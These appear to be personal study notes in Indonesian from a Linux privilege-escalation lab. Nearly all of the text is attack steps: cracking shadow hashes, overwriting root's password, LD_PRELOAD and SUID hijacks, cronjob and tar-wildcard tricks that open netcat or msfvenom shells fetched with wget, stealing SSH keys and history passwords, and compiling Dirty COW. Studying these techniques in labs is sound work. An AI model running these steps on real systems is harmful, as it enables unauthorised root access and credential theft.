1. ssh user@ip -oHostKeyAlgorithms=+ssh-rsa
2. pake sqliudf ->  /tools/mysqludf -> terus jalanin kayak di : https://www.exploit-db.com/exploits/1518
3. pake shadow -> cat /etc/passwd -> passwd nya itu antara (:) yang jumlahnya 1 -> abis itu pake john nanti nemu
- kalau udah su ke root, ganti passwd root baru -> mkpasswd -m sha-512 apadah -> vim /etc/passwd -> replace passwd lama nya
4. pake passwd -> openssl passwd paswordbalu -> pas dah generate edit /etc/passwd -> replace x nya -> su root pake passwd balu5. pake gtfo bins -> sudo -l -> cari apa aja yang di list yang bisa dijalanin sudo nopasswd -> cobain 1 1
6. pake preload -> gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
- kalau udah -> sudo LD_PRELOAD=/tmp/preload.so ygnopassswd-di-sudo-l-pathnya. prelod ama library beda
7. pakai cronjob -> cat etc/crontab -> locate overwrite.sh -> edit isi file bash nya -> nyalain nc port di file bash
- kalau ga jalan bash dulu file nya, kadang nyambung2 sendiri
8. cronjob path env -> buat overwrite.sh di path cat aja /etc/crontab ada path -> lakuin terus run yang di /tmp noh
9. cronjob wildcard -> cat /usr/local/bin/compress -> bikin shell pakai msfvenom command ada di file lain -> kirim aja pake httpserver
-> wget aja, terus nyalain nc port  nya -> di ssh touch /home/user/--checkpoint=1, touch /home/user/--checkpoint-action=exec=shell, run, ls aja
10. suid sgid executable known exploit -> run find nya -> analisis bin nya -> run exploit nya
11. suid-so -> run sambil grep -ie "open|access|no such file" -> terus ada .config mkdir dulu 
-> gcc in libcalc di tools kesitu -> run lagi suid-so nya
12. suid-env -> run path env nya -> strings path env -> gcc -o namafile sumberfile.c -> atur path PATH=.:$PATH /usr/local/bin/suid-env
13. suid-env2 -> strings dulu coba suid-env2 nya -> ada /service itu -> cek /bin/bash --version -> ada vuln nya 
-> ada function bash yang kudu dibuat -> cuman run /bin/bash -p kok -> export -> run service tadi
14. passwd and key: history -> cat ~/.*history | less -> ada . file klo ga percaya ls -la aja di home nya
-> semua yg di type keliatan disitu -> su aja
15. passwd and key: config files -> cat myvpn disitu -> ada path dir credentials nya di /etc -> cat aja
16. passwd abd key: ssh key -> ls -la / -> ls di .ssh nya -> pindahin key ke machinemu -> chmod 600 -> ssh -i pake key itu 
-> root@ip -> pake aja key tadi
17. nfs -> cek di target /etc.exports-> mkdir nfs di /tmp -> mount -o rw,verse ip:/tmp /tmp/dir -> upload msfvenom elf
 -> chmod xs dulu -> baru cek di target, /tmp/ -> run aja elf nya di target 
18. kernel exploits -> run perl ada script buat list cve kernel exploit -> gcc kernel/c0w.c -o c0w -> ./c0w
-> lanjut /usr/bin/passwd -> coba dulu -> mv pas jadi root /tmp/bak nya jadi binpasswd kek tadi
19. privilege escalation script -> di /tools ada -> linpeas linenum lse -> pakai aja itu ada beberapa ingfo -> ga auto root
